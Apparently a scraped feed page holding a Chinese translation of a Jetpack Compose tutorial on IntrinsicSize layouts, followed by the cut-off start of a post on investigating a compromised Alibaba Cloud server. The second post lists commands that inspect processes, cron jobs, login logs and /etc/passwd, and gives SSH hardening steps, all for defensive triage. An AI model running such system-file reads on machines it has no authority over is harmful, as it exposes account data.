pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本文译自「Mastering IntrinsicSize in Jetpack Compose: A Real-World Guide」，原文链接<a href="https://link.juejin.cn?target=https%3A%2F%2Fproandroiddev.com%2Fmastering-intrinsicsize-in-jetpack-compose-a-real-world-guide-a57ab90c6556" target="_blank" title="https://proandroiddev.com/mastering-intrinsicsize-in-jetpack-compose-a-real-world-guide-a57ab90c6556" ref="nofollow noopener noreferrer">proandroiddev.com/mastering-i…</a>，由Sehaj kahlon发布于2026年1月24日。</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/686bd52c0b2a4b4cb6a463af988b9e3e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iA5pyJ54y_6K-J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770386256&amp;x-signature=4unr45DRgBAjml%2FKu9%2FTYzR3Bgw%3D" alt="0.png" loading="lazy"/></p>
<p>如果你一直在使用 Jetpack Compose，你可能遇到过布局行为与预期不符的令人沮丧的情况。也许是 <code>Box</code> 中的 <code>weight()</code> 修饰符导致了奇怪的行为，或者你的分层 UI 元素大小不正确。</p>
<p>这时 <strong><code>IntrinsicSize</code></strong> 就派上用场了——相信我，一旦你理解了它，它将成为你 Compose 工具箱中最强大的工具之一。</p>
<h2 data-id="heading-0">问题：一个真实的生产场景</h2>
<p>最近，我正在为一个应用程序构建详情页面。设计要求：</p>
<ol>
<li>
<p>顶部放置一张<strong>标题图片</strong></p>
</li>
<li>
<p>一张<strong>卡片</strong>，与标题图片重叠 56dp</p>
</li>
<li>
<p>从标题图片到柔和灰色背景的<strong>平滑过渡</strong></p>
</li>
</ol>
<p>我们想要实现的效果如下：</p>
<blockquote>
<p><em><strong>💡 设计目标：</strong></em> <em>创建一个卡片，使其优雅地与标题图片重叠，并实现无缝的背景过渡。</em></p>
</blockquote>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7b027b0681c9444d90b46765cead83d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iA5pyJ54y_6K-J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770386256&amp;x-signature=vm6WiZb6vsTP2u32FoGpXi07S9o%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">挑战</h2>
<p>我需要创建一个包含两层的“盒子Box”：</p>
<ul>
<li>
<p><strong>图层 1（背景）：</strong> 顶部 56dp 的透明区域，然后是柔和的灰色背景</p>
</li>
<li>
<p><strong>图层 2（卡片）：</strong> 绘制在顶部的实际卡片内容</p>
</li>
</ul>
<p>这是我的第一个作品尝试：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">OverlappingCardContent</span><span class="hljs-params">(overlapHeight: <span class="hljs-type">Dp</span>)</span></span> {
    Box(modifier = Modifier.fillMaxWidth()) {
        <span class="hljs-comment">// Layer 1: Background</span>
        Column(modifier = Modifier.fillMaxWidth()) {
            Spacer(modifier = Modifier.height(overlapHeight)) <span class="hljs-comment">// 56dp transparent</span>
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .weight(<span class="hljs-number">1f</span>)  <span class="hljs-comment">// Fill remaining space with soft background</span>
                    .background(color = Color.LightGray)
            )
        }

        <span class="hljs-comment">// Layer 2: Card</span>
        Card(modifier = Modifier.fillMaxWidth()) {
            <span class="hljs-comment">// Card content...</span>
        }
    }
}
</code></pre>
<p><strong>但是这行不通！</strong> 😩</p>
<p><code>weight(1f)</code>修饰符导致了问题。布局要么意外地折叠，要么意外地展开。</p>
<h2 data-id="heading-2">了解根本原因</h2>
<p>为了理解为什么会失败，我们先回顾一下 Compose 布局的工作原理。</p>
<h3 data-id="heading-3">Compose 布局：单遍系统</h3>
<p>为了提高性能，Compose 布局采用<strong>单次遍历</strong>方式测量布局。每个可组合元素：</p>
<ol>
<li>
<p>从父元素接收约束</p>
</li>
<li>
<p>测量其子元素</p>
</li>
<li>
<p>确定自身大小</p>
</li>
<li>
<p>放置其子元素</p>
</li>
</ol>
<p>问题在于：当像 <code>Box</code> 这样的父元素测量其子元素时，每个子元素都不知道其他子元素的大小。它们是独立测量的。</p>
<h2 data-id="heading-4">为什么 <code>weight(1f)</code> 会失败</h2>
<p><code>weight()</code> 修饰符表示：“占据剩余空间的 X 倍。”</p>
<p>但是剩余空间指的是<strong>什么</strong>？<code>Box</code> 元素尚未确定自身高度——它正在等待子元素告知其自身大小。这会造成循环依赖：</p>
<pre><code class="hljs language-bash" lang="bash">Box: <span class="hljs-string">"Children, how tall are you?"</span>
  ├─ Column: <span class="hljs-string">"I need 56dp + whatever weight(1f) gives me"</span>
  │

  <span class="hljs-string">"But weight depends on your height, Box!"</span>
  └─ Card: <span class="hljs-string">"I need ~180dp for my content"</span>  Box: <span class="hljs-string">"I'm confused..."</span> 🤯
</code></pre>
<h2 data-id="heading-5">引入 IntrinsicSize：打破循环依赖</h2>
<p><code>IntrinsicSize</code> 是 Compose 在实际测量之前向子元素询问一个<strong>假设性问题</strong> 的方式：</p>
<blockquote>
<p><em><strong>“如果我给你无限的空间，你需要的最小（或最大）高度是多少？”</strong></em></p>
</blockquote>
<h2 data-id="heading-6">IntrinsicSize.Min 与 IntrinsicSize.Max</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4cf9ddbec314433fa358f44c9985ee53~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iA5pyJ54y_6K-J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770386256&amp;x-signature=NRXoBBMLT2ROOiCqJsAPmtmyxoo%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-7">修复</h2>
<pre><code class="hljs language-kotlin" lang="kotlin">Box(
    modifier = Modifier
        .fillMaxWidth()
        .height(IntrinsicSize.Min)  <span class="hljs-comment">// ← The magic line!</span>
) {
    <span class="hljs-comment">// Layer 1: Background</span>
    Column(modifier = Modifier.fillMaxWidth()) {
        Spacer(modifier = Modifier.height(<span class="hljs-number">56.</span>dp))
        Box(
            modifier = Modifier
                .fillMaxWidth()
                .weight(<span class="hljs-number">1f</span>)
                .background(color = Color.LightGray)
        )
    }

    <span class="hljs-comment">// Layer 2: Card</span>
    Card(modifier = Modifier.fillMaxWidth()) {
        <span class="hljs-comment">// Card content...</span>
    }
}
</code></pre>
<p>现在布局正常了！原因如下：</p>
<h2 data-id="heading-8">IntrinsicSize.Min 如何解决冲突</h2>
<p>当 <code>Box</code> 使用 <code>height(IntrinsicSize.Min)</code> 时，它会询问每个子元素：</p>
<p><strong>列的最小固有高度：</strong></p>
<pre><code class="hljs language-bash" lang="bash">Spacer: 56dp (fixed)
Weighted Box: 0dp (minimum, can shrink to nothing)
Total: 56dp
</code></pre>
<p><strong>卡片的最小固有高度：</strong></p>
<pre><code class="hljs language-bash" lang="bash">Status row + Title + Subtitle + Button + Padding = ~180dp
Total: ~180dp
</code></pre>
<p><strong>Box 选择：</strong> <code>max(56dp, 180dp)</code> = <strong>180dp</strong></p>
<p>为什么是 <code>max()</code>？因为 Box 的高度需要足以容纳<strong>所有</strong>子元素！</p>
<p>现在布局完全知道如何高度要合适，<code>weight(1f)</code> 可以正常工作：</p>
<ul>
<li>
<p>盒子高度：180dp</p>
</li>
<li>
<p>间距：56dp</p>
</li>
<li>
<p>加权背景盒子：180dp — 56dp = <strong>124dp</strong></p>
</li>
</ul>
<h2 data-id="heading-9">完整解决方案：重叠卡片式 UI</h2>
<p>以下是支持此 UI 的最终代码：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> OVERLAP_HEIGHT = <span class="hljs-number">56.</span>dp
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">HeaderWithOverlappingCard</span><span class="hljs-params">(imageHeight: <span class="hljs-type">Dp</span>)</span></span> {
    LazyColumn {
        <span class="hljs-comment">// Create overlap: position content before header ends</span>
        item { 
            Spacer(modifier = Modifier.height(imageHeight - OVERLAP_HEIGHT)) 
        }

        item {
            OverlappingCardContent(overlapHeight = OVERLAP_HEIGHT)
        }
    }
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">OverlappingCardContent</span><span class="hljs-params">(overlapHeight: <span class="hljs-type">Dp</span>)</span></span> {
    Box(
        modifier = Modifier
            .fillMaxWidth()
            .height(IntrinsicSize.Min)
    ) {
        <span class="hljs-comment">// Layer 1: Background transition</span>
        Column(modifier = Modifier.fillMaxWidth()) {
            Spacer(modifier = Modifier.height(overlapHeight)) <span class="hljs-comment">// Transparent over header</span>
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .weight(<span class="hljs-number">1f</span>)
                    .background(color = SoftGrayBackground)
            )
        }

        <span class="hljs-comment">// Layer 2: Card content (drawn on top)</span>
        Card(
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = <span class="hljs-number">8.</span>dp),
            shape = RoundedCornerShape(<span class="hljs-number">12.</span>dp)
        ) {
            Column(modifier = Modifier.padding(<span class="hljs-number">24.</span>dp)) {
                Text(<span class="hljs-string">"✓ Success"</span>, color = Color.Green)
                Text(<span class="hljs-string">"₹100 Cashback"</span>, style = MaterialTheme.typography.h4)
                Text(<span class="hljs-string">"Transaction complete"</span>)
                Spacer(modifier = Modifier.height(<span class="hljs-number">16.</span>dp))
                Button(onClick = {}) { Text(<span class="hljs-string">"View Details"</span>) }
            }
        }
    }
}
</code></pre>
<h2 data-id="heading-10">可视化分解</h2>
<pre><code class="hljs language-kotlin" lang="kotlin">imageHeight = 200dp
overlapHeight = 56dp
</code></pre>
<pre><code class="hljs language-bash" lang="bash">LazyColumn positions:
├─ Spacer: 144dp (200 - 56)
└─ OverlappingCardContent starts at Y = 144dp
</code></pre>
<pre><code class="hljs language-bash" lang="bash">Inside OverlappingCardContent (height = 180dp via IntrinsicSize.Min):
├─ Column Layer:
│   ├─ Spacer: 56dp (transparent, header shows through)
│   └─ Background Box: 124dp (soft gray)
└─ Card Layer: 180dp (drawn from top, overlaps header)
</code></pre>
<h2 data-id="heading-11">IntrinsicSize 的常见用例</h2>
<h3 data-id="heading-12">1. 一行中高度相同的按钮</h3>
<p><strong>问题：</strong> 文本长度不同的按钮最终高度也不同。</p>
<p><strong>解决方案：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">Row(modifier = Modifier.height(IntrinsicSize.Min)) {
    Button(
        modifier = Modifier.weight(<span class="hljs-number">1f</span>).fillMaxHeight(),
        onClick = {}
    ) { Text(<span class="hljs-string">"Short"</span>) }

    Button(
        modifier = Modifier.weight(<span class="hljs-number">1f</span>).fillMaxHeight(),
        onClick = {}
    ) { Text(<span class="hljs-string">"This is a much\nlonger button\nwith more text"</span>) }
}
</code></pre>
<p><strong>结果：</strong> 两个按钮的高度都与最高的按钮高度相同。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd649e881a4e414c863752eac8df27e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iA5pyJ54y_6K-J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770386256&amp;x-signature=R5UuRucbFgrVNft6gRKQdW8BYRs%3D" alt="3.png" width="70%" loading="lazy"/></p>
<h3 data-id="heading-13">2. 分隔线与父元素高度匹配</h3>
<p><strong>问题：</strong> 分隔线无法拉伸以匹配多行内容。</p>
<p><strong>解决方案：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">Row(modifier = Modifier.height(IntrinsicSize.Min)) {
    Text(<span class="hljs-string">"Left content\nwith multiple\nlines"</span>)

    Divider(
        modifier = Modifier
            .fillMaxHeight()
            .width(<span class="hljs-number">1.</span>dp)
    )

    Text(<span class="hljs-string">"Right"</span>)
}
</code></pre>
<p><strong>结果：</strong> 分隔线可以拉伸以匹配多行文本的高度。</p>
<p align="center"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a98827db35040439fa2d0659209ff1d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iA5pyJ54y_6K-J:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770386256&amp;x-signature=6yWDTszRwQlJcKzyZbqg0LpAdXE%3D" alt="4.png" width="70%" loading="lazy"/></p>
<h3 data-id="heading-14">3. 带有动态内容和固定覆盖层的卡片</h3>
<p><strong>问题：</strong> 覆盖层需要与卡片宽度匹配，但卡片宽度是动态的。</p>
<p><strong>解决方案：</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin">Box(modifier = Modifier.width(IntrinsicSize.Max)) {
    Card {
        Column {
            Text(<span class="hljs-string">"Dynamic content here..."</span>)
            <span class="hljs-comment">// More content</span>
        }
    }

    <span class="hljs-comment">// Badge that should match card width</span>
    Badge(
        modifier = Modifier
            .align(Alignment.TopEnd)
            .fillMaxWidth()
    )
}
</code></pre>
<h2 data-id="heading-15">性能相关注意事项 ⚠️</h2>
<p><code>IntrinsicSize</code> 会触发<strong>两遍测量</strong>：</p>
<ol>
<li>
<p>第一遍：查询固有尺寸</p>
</li>
<li>
<p>第二遍：实际测量和布局</p>
</li>
</ol>
<p>这会带来一定的性能开销。谨慎使用：</p>
<h2 data-id="heading-16">✅ 适用场景</h2>
<ul>
<li>
<p>复杂的分层 UI（例如我们的重叠卡片）</p>
</li>
<li>
<p>使同级元素大小一致</p>
</li>
<li>
<p>使分隔符/分隔线与内容匹配</p>
</li>
<li>
<p>需要子元素协调大小时</p>
</li>
</ul>
<h2 data-id="heading-17">❌ 避免使用场景</h2>
<ul>
<li>
<p>在可能会重复数百次的 <code>LazyColumn</code>/<code>LazyRow</code> 元素中</p>
</li>
<li>
<p>深度嵌套的固有尺寸</p>
</li>
<li>
<p>当固定尺寸或 <code>wrapContentHeight()</code> 可以满足需求时</p>
</li>
<li>
<p>在性能关键路径中</p>
</li>
</ul>
<h2 data-id="heading-18">要点</h2>
<ol>
<li>
<p><code>**IntrinsicSize.Min**</code> = "使用子元素所需的最小高度"</p>
</li>
<li>
<p><code>**IntrinsicSize.Max**</code> = "使用子元素可能需要的最大高度"</p>
</li>
<li>
<p>它解决了父元素和子元素尺寸之间的循环依赖关系</p>
</li>
<li>
<p>对于子元素使用 <code>weight()</code> 或 <code>fillMaxHeight()</code> 的分层 UI 至关重要</p>
</li>
<li>
<p>会带来性能开销——请谨慎使用</p>
</li>
</ol>
<h2 data-id="heading-19">结论</h2>
<p><code>IntrinsicSize</code> 看似是一个小众的 API，但它对于在 Compose 中构建复杂的 UI 至关重要。我们构建的重叠卡片模式只是其中一个例子——当你需要协调同级元素的大小，或者当分层布局需要“统一”尺寸时，你会发现它非常实用。</p>
<p>下次当你的 Compose 布局在使用 <code>weight()</code> 或 <code>fillMaxHeight()</code> 时出现异常行为时，请记住：<strong>IntrinsicSize 或许能帮你解决问题</strong>。</p>
<p><em>如果你有任何疑问或发现了 IntrinsicSize 的其他创意用法，请在下方留言！</em></p>
<p><strong>关注我，获取更多 Android 开发技巧。</strong></p>
<blockquote>
<p>欢迎搜索并关注 <em>公众号<a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fmp%2Fqrcode%3Fscene%3D10000004%26size%3D512%26__biz%3DMzU1MDg0NDczNA%3D%3D%26mid%3D2247484417%26idx%3D1%26sn%3D60c15f0d3c4be75e37748c2472a74102" target="_blank" title="https://mp.weixin.qq.com/mp/qrcode?scene=10000004&amp;size=512&amp;__biz=MzU1MDg0NDczNA==&amp;mid=2247484417&amp;idx=1&amp;sn=60c15f0d3c4be75e37748c2472a74102" ref="nofollow noopener noreferrer">「稀有猿诉」</a></em> 获取更多的优质文章！</p>
<p>保护原创，请勿转载！</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[阿里云服务器一直被病毒攻击，该如何排查呢？]]></title>    <link>https://juejin.cn/post/7600990891207016475</link>    <guid>https://juejin.cn/post/7600990891207016475</guid>    <pubDate>2026-01-30T12:12:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600990891207016475" data-draft-id="7600752623069249546" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="阿里云服务器一直被病毒攻击，该如何排查呢？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-30T12:12:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="90后晨仔"/> <meta itemprop="url" content="https://juejin.cn/user/2717648476705773"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            阿里云服务器一直被病毒攻击，该如何排查呢？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2717648476705773/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    90后晨仔
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T12:12:39.000Z" title="Fri Jan 30 2026 12:12:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">一、<strong>立即应急响应</strong></h3>
<ol>
<li>
<p><strong>断开网络（如情况严重）</strong><br/>
如果攻击正在造成严重危害（如大量外发流量、挖矿、勒索等），可临时在阿里云控制台将实例<strong>安全组规则设为拒绝所有入站/出站</strong>，或直接<strong>停止实例</strong>，防止进一步扩散。</p>
</li>
<li>
<p><strong>不要直接删除可疑文件</strong><br/>
先保留证据，用于后续分析。可以将可疑进程、文件、日志备份到其他安全位置。</p>
</li>
<li>
<p><strong>检查当前运行的进程与网络连接</strong><br/>
登录服务器后执行：</p>
<pre><code class="hljs language-bash" lang="bash">top                    <span class="hljs-comment"># 查看高CPU占用进程</span>
ps aux                 <span class="hljs-comment"># 列出所有进程</span>
netstat -tulnp         <span class="hljs-comment"># 查看监听端口及对应进程</span>
ss -tulnp              <span class="hljs-comment"># 更现代的替代命令</span>
lsof -i                <span class="hljs-comment"># 查看哪些进程在使用网络</span>
</code></pre>
</li>
<li>
<p><strong>检查定时任务与启动项</strong><br/>
病毒常通过 cron 或 systemd 持久化：</p>
<pre><code class="hljs language-bash" lang="bash">crontab -l             <span class="hljs-comment"># 当前用户定时任务</span>
<span class="hljs-built_in">cat</span> /etc/crontab       <span class="hljs-comment"># 系统级定时任务</span>
<span class="hljs-built_in">ls</span> /etc/cron.d/
systemctl list-unit-files --<span class="hljs-built_in">type</span>=service | grep enabled
<span class="hljs-built_in">ls</span> /etc/init.d/
</code></pre>
</li>
<li>
<p><strong>检查新增用户或异常SSH登录</strong></p>
<pre><code class="hljs language-bash" lang="bash">last                   <span class="hljs-comment"># 查看最近登录记录</span>
<span class="hljs-built_in">who</span>                    <span class="hljs-comment"># 当前登录用户</span>
<span class="hljs-built_in">cat</span> /etc/passwd        <span class="hljs-comment"># 检查是否有异常用户（UID 0 非 root）</span>
grep <span class="hljs-string">"Accepted"</span> /var/log/auth.log  <span class="hljs-comment"># Ubuntu/Debian</span>
grep <span class="hljs-string">"Accepted"</span> /var/log/secure    <span class="hljs-comment"># CentOS/RHEL</span>
</code></pre>
</li>
</ol>
<hr/>
<p>###二、<strong>漏洞排查与修复</strong></p>
<ol>
<li>
<p><strong>确保系统和软件最新</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># Ubuntu/Debian</span>
sudo apt update &amp;&amp; sudo apt upgrade -y

<span class="hljs-comment"># CentOS/RHEL</span>
sudo yum update -y   <span class="hljs-comment"># 或 dnf update（CentOS 8+）</span>
</code></pre>
</li>
<li>
<p><strong>关闭不必要的服务和端口</strong><br/>
使用 <code>nmap localhost</code> 或 <code>ss -tuln</code> 查看开放端口，关闭不用的服务（如 FTP、Telnet、Redis 未授权访问等）。</p>
</li>
<li>
<p><strong>修改默认 SSH 配置</strong><br/>
编辑 <code>/etc/ssh/sshd_config</code>：</p>
<pre><code class="hljs language-perl" lang="perl">Port <span class="hljs-number">22222</span>               <span class="hljs-comment"># 改为非标准端口（记得在安全组放行）</span>
PermitRootLogin <span class="hljs-keyword">no</span>       <span class="hljs-comment"># 禁止 root 登录</span>
PasswordAuthentication <span class="hljs-keyword">no</span> <span class="hljs-comment"># 改用密钥登录（更安全）</span>
AllowUsers your_user     <span class="hljs-comment"># 仅允许特定用户</span>
</code></pre>
<p>修改后重启 SSH：<code>sudo systemctl restart sshd</code></p>
</li>
<li>
<p><strong>安装并配置防火墙</strong></p>
<ul>
<li>使用 <code>ufw</code>（Ubuntu）或 <code>firewalld</code>（CentOS）</li>
